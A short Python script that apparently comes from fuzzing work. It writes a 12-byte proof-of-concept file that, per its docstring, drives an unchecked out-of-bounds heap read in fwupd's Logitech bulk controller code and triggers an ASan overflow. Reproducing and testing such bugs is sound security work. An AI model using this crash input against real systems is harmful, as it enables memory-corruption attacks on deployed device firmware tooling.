#!/usr/bin/env python3
"""Generate PoC for fwupd-logitech-oob-read.

Verbatim 12-byte sequence from PR #9791 fuzzing/generate_oob_poc.py.
Drives fu_logitech_bulkcontroller_device_sync_wait_any → unchecked
g_byte_array_append (1 MiB read past 4 KiB buffer) → ASan heap-buffer-
overflow.
"""

def create_poc(output='poc.bin'):
    blob = bytes([0x06, 0xCC, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00])
    with open(output, 'wb') as f:
        f.write(blob)
    print(f"wrote {output} ({len(blob)} bytes)")


if __name__ == '__main__':
    create_poc()
